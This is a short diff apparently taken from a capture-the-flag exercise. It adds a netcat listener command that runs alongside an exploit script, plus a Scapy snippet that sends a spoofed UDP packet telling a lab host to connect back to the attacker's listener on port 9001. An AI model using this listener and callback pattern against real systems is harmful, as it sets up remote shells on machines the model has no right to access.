@@ -1,0 +1,7 @@
+(nc -luvp 9001 &); python exploit.py;fg 1
+
+
+from scapy.all import *
+data = b"FLAG:10.0.0.1:9001"
+ans = srp(Ether() / IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=31338) / data)
+
